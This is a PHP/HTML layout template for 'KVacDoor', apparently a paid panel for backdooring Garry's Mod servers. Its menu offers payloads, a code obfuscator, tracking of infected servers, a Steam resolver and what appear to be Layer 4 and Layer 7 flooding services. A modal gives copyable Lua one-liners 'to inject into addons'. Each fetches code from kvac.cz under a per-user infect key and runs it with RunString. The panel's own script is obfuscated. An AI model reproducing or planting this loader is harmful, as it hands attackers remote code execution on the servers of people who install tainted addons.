<!DOCTYPE html>
<html lang="fr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title><?= WEBSITE_NAME ?> - <?= $title ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta content="Panel d'administration avancée" name="description" />
    <meta content="WaDixix" name="author" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- App favicon -->
    <link rel="shortcut icon" href="/assets/img/favicon.ico">

    <!-- App css -->
    <link rel="stylesheet" type="text/css" href="/assets/plugins/sweetalert2/sweetalert2.min.css?v=1.2" />
    <link rel="stylesheet" type="text/css" href="/assets/css/vendor.jzqOlvBu.css" /> <!-- vendor.jzqOlvBu.css -->
    <link rel="stylesheet" type="text/css" href="/assets/css/app.y4VvQGPo.css" /> <!-- app.y4VvQGPo.css -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="/assets/js/wadixexec.js?v=1.2"></script>
    <script src="/assets/js/kvac.js.php"></script>

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-179149312-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'UA-179149312-1');


        <?php if ($AUTHUSER['roles'] >= 3) : ?>

            function admin_mode() {
                $['ajax']({
                    'url': '/ajax/switch_admin.php',
                    'success': data => {
                        window.location.reload();
                    }
                })
            }
        <?php endif; ?>
    </script>
</head>

<body>
    <div id="app-layouts">

        <header id="page-topbar">
            <div class="navbar-header">
                <div class="navbar-brand-box d-flex align-items-left">
                    <a href="/overview" class="logo">
                        <span><img src="/assets/img/logo/logo-light.png" alt="KVacDoor" height="25"></span>
                        <i><img src="/assets/img/logo/logo-small.png" alt="KVacDoor" height="24"></i>
                    </a>
                    <button type="button" class="btn btn-sm mr-2 d-lg-none px-3 font-size-16 header-item waves-effect waves-light" id="vertical-menu-btn">
                        <i class="fa fa-fw fa-bars"></i>
                    </button>
                </div>

                <div class="d-flex align-items-center">

                    <div class="dropdown d-inline-block ml-2">
                        <button type="button" class="btn header-item waves-effect waves-light" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <img class="rounded-circle header-profile-user" src="<?= htmlentities($AUTHUSER['avatar']); ?>" onerror="errorAvatar(this)">
                            <span class="d-none d-sm-inline-block ml-1"><?= htmlentities($AUTHUSER['username']); ?></span>
                            <i class="mdi mdi-chevron-down d-none d-sm-inline-block"></i>
                        </button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <a class="dropdown-item d-flex align-items-center justify-content-between" href="/profile/<?= $_SESSION['user']['id'] ?>">Profile</a>
                            <?php if ($AUTHUSER['roles'] >= 1) : ?>
                                <a class="dropdown-item d-flex align-items-center justify-content-between" href="#" data-toggle="modal" data-target="#luarun-backdoor">Lua Code</a>
                            <?php endif; ?>
                            <a class="dropdown-item d-flex align-items-center justify-content-between" href="#" data-toggle="modal" data-target="#online-member">Online Members</a>
                            <?php if ($AUTHUSER['roles'] >= 3) : ?>
                                <a class="dropdown-item d-flex align-items-center justify-content-between" href="#" onclick="admin_mode()">Admin Mode</a>
                            <?php endif; ?>
                            <a class="dropdown-item d-flex align-items-center justify-content-between" href="/logout?csrf=<?= sha1($_SESSION['user']['id']) ?>"><span>Log Out</span></a>
                        </div>
                    </div>

                </div>
            </div>
        </header>

        <div class="vertical-menu">
            <div data-simplebar class="h-100">
                <div id="sidebar-menu">
                    <ul class="metismenu list-unstyled" id="side-menu">
                        <li class="menu-title">Hub</li>

                        <li><a href="/overview" class="waves-effect"><i class="fa fa-home"></i><span>Overview</span></a></li>
                        <li><a href="/servers" class="waves-effect"><i class="fa fa-server"></i><span>My servers</span><span class="badge badge-pill badge-info float-right" id="serveronline">...</span></a></li>
                        <li><a href="/servers/history" class="waves-effect <?= ($AUTHUSER['roles'] >= 1) ? '' : 'sidebar-forbidden'; ?>"><i class="fa fa-history"></i><span>History of Servers</span></a></li>
                        <li <?= ($AUTHUSER['roles'] >= 1) ? '' : 'data-toggle="tooltip" data-placement="right" data-original-title="ONLY FOR PREMIUM MEMBERS"'; ?>><a href="/payload" class="waves-effect <?= ($AUTHUSER['roles'] >= 1) ? '' : 'sidebar-forbidden'; ?>" title="ONLY FOR VIP MEMBERS"><i class="fa fa-rocket"></i><span>Payloads</span></a></li>

                        <li class="menu-title">Tools</li>

                        <li <?= ($AUTHUSER['roles'] >= 1) ? '' : 'data-toggle="tooltip" data-placement="right" data-original-title="ONLY FOR PREMIUM MEMBERS"'; ?>><a href="/obfuscator" class="waves-effect <?= ($AUTHUSER['roles'] >= 1) ? '' : 'sidebar-forbidden'; ?>"><i class="fa fa-code"></i><span>Obfuscator</span></a></li>
                        <li <?= ($AUTHUSER['roles'] >= 1) ? '' : 'data-toggle="tooltip" data-placement="right" data-original-title="ONLY FOR PREMIUM MEMBERS"'; ?>><a href="/smart-lua" class="waves-effect <?= ($AUTHUSER['roles'] >= 1) ? '' : 'sidebar-forbidden'; ?>"><i class="fab fa-accessible-icon"></i><span>Smart Lua</span></a></li>
                        <li <?= ($AUTHUSER['roles'] >= 1) ? '' : 'data-toggle="tooltip" data-placement="right" data-original-title="ONLY FOR PREMIUM MEMBERS"'; ?>><a href="/lua-scanner" class="waves-effect <?= ($AUTHUSER['roles'] >= 1) ? '' : 'sidebar-forbidden'; ?>"><i class="fa fa-blind"></i><span>Lua Scanner</span></a></li>
                        <li <?= ($AUTHUSER['xray'] == 1) ? '' : 'data-toggle="tooltip" data-placement="right" data-original-title="ONLY FOR STEAM RESOLVER SUBCRIPTION"'; ?>><a href="/steam-resolver" class="waves-effect <?= ($AUTHUSER['xray'] == 1) ? '' : 'sidebar-forbidden'; ?>"><i class="fab fa-steam"></i><span>Steam Resolver</span></a></li>

                        <li class="menu-title">Network Hub</li>

                        <li <?= (strtotime($AUTHUSER['network_expire']) >= time()) ? '' : ''; ?>><a href="/layer4" class="waves-effect <?= (strtotime($AUTHUSER['network_expire']) >= time()) ? '' : 'sidebar-forbidden'; ?>"><i class="fa fa-wifi"></i><span>Network L4</span></a></li>
                        <li <?= (strtotime($AUTHUSER['network_expire']) >= time()) ? '' : ''; ?>><a href="/layer7" class="waves-effect <?= (strtotime($AUTHUSER['network_expire']) >= time()) ? '' : 'sidebar-forbidden'; ?>"><i class="fa fa-globe"></i><span>Network L7</span></a></li>
                        <li <?= (strtotime($AUTHUSER['network_expire']) >= time()) ? '' : ''; ?>><a href="/api-manager" class="waves-effect <?= (strtotime($AUTHUSER['network_expire']) >= time()) ? '' : 'sidebar-forbidden'; ?>"><i class="fa fa-link"></i><span>API Manager</span></a></li>
                        <li class="menu-title">Others</li>

                        <li><a href="/rules" class="waves-effect"><i class="fa fa-gavel"></i><span>Rules</span></a></li>
                        <li><a href="/documentation" class="waves-effect"><i class="fas fa-book"></i><span>Documentation</span></a></li>
                        <li><a href="/members" class="waves-effect"><i class="fa fa-users"></i><span>Members</span></a></li>
                        <li><a href="/leaderboard" class="waves-effect"><i class="fas fa-trophy"></i><span>Leaderboard</span></a></li>
                        <li><a href="/market" class="waves-effect"><i class="fa fa-shopping-cart"></i><span>Market</span></a></li>

                        <?php if ($AUTHUSER['roles'] == 3 && $_SESSION['admin_mode'] == 1) : ?>
                            <li class="menu-title">Administration</li>

                            <li><a href="/logs" class="waves-effect"><i class="fa fa-eye"></i><span>Logs</span></a></li>
                            <li><a href="/allservers" class="waves-effect"><i class="fa fa-server"></i><span>All Servers</span></a></li>
                        <?php endif; ?>
                    </ul>
                </div>
            </div>
        </div>

        <div class="main-content">
            <div class="container-fluid">
                <?php if ($AUTHUSER['roles'] >= 2 && $_SESSION['admin_mode'] == 1) : ?>
                    <div class="alert alert-danger text-center"><b>Admin Mode Enabled !</b>, Never share your screen with other users</div>
                <?php endif; ?>
                <?= $pageContent; ?>

            </div>
        </div>

    </div>

    <div class="menu-overlay"></div>

    <?php if ($AUTHUSER['roles'] >= 1) : ?>
        <div class="modal fade" id="luarun-backdoor" tabindex="-1" role="dialog" aria-labelledby="luarun-backdoorLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fa fa-code"></i> Lua Code</h5>
                        <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <p>LuaCode (to inject into addons)</p>
                        <div class="input-group mb-3">
                            <input type="text" class="form-control" id="copyfetch" value='timer.Simple(1, function() http.Fetch("https://kvac.cz/f.php?key=<?= $AUTHUSER['infectkey'] ?>", function(b) RunString(b, ":", false) end)end)'>
                            <div class="input-group-append">
                                <button class="btn btn-primary" onclick="fetchurlcopy();" type="button">Copy</button>
                            </div>
                        </div>
                        <p>Luarun (to launch the code in game)</p>
                        <div class="input-group mb-3">
                            <input type="text" class="form-control" id="copyfetch2" value='http.Fetch([[https:/]]..[[/kvac.cz/f.php?key=<?= $AUTHUSER['infectkey'] ?>]],function(k)RunString(k,[[:]],!1)end)'>
                            <div class="input-group-append">
                                <button class="btn btn-primary" onclick="fetchurlcopy2();" type="button">Copy</button>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary waves-effect waves-light" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
    <?php endif; ?>

    <div class="modal fade" id="online-member" tabindex="-1" role="dialog" aria-labelledby="online-memberLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fa fa-users"></i> Online Members</h5>
                    <button type="button" class="close waves-effect waves-light" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <table class="table table-centered table-nowrap">
                        <thead>
                            <tr>
                                <th>Name</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach (User::getAll() as $user) : ?>
                                <?php if ($user['last_login'] + 120 < time()) continue; ?>
                                <tr>
                                    <td class="table-user">
                                        <img src="<?= $user['avatar'] ?>" alt="<?= htmlentities($user['username']) ?>" class="mr-2 avatar-xs rounded-circle" onerror="errorAvatar(this)">
                                        <a href="/profile/<?= $user['id'] ?>" class="text-body font-weight-semibold"><?= htmlentities($user['username']) ?></a>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary waves-effect waves-light" data-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        var _0x3781 = [
            'html',
            '../ajax/server_count.php',
            '#serveronline'
        ];
        (function(_0x8714d7, _0x33a254) {
            var _0x4b66e2 = function(_0x17ca22) {
                while (--_0x17ca22) {
                    _0x8714d7['push'](_0x8714d7['shift']());
                }
            };
            _0x4b66e2(++_0x33a254);
        }(_0x3781, 0x9a));
        var _0x1279 = function(_0x1e9aec, _0x37a1c3) {
            _0x1e9aec = _0x1e9aec - 0x0;
            var _0x32955e = _0x3781[_0x1e9aec];
            return _0x32955e;
        };

        function nAjJ265aP() {
            $['ajax']({
                'method': 'POST',
                'url': _0x1279('0x0'),
                'success': _0x3331b9 => {
                    if (!isNaN(_0x3331b9)) {
                        $(_0x1279('0x1'))[_0x1279('0x2')](_0x3331b9);
                    }
                }
            });
        }
        nAjJ265aP();
        setInterval(nAjJ265aP, 0x1388);
    </script>

    <script src="/assets/js/jquery.min.js"></script>
    <script src="/assets/js/bootstrap.bundle.min.js"></script>
    <script src="/assets/js/metismenu.min.js"></script>
    <script src="/assets/js/waves.js"></script>
    <script src="/assets/js/simplebar.min.js"></script>
    <script src="/assets/plugins/chart-js/chart.min.js"></script>
    <script src="/assets/plugins/sweetalert2/sweetalert2.min.js"></script>
    <script src="/assets/js/app.js"></script>
</body>

</html>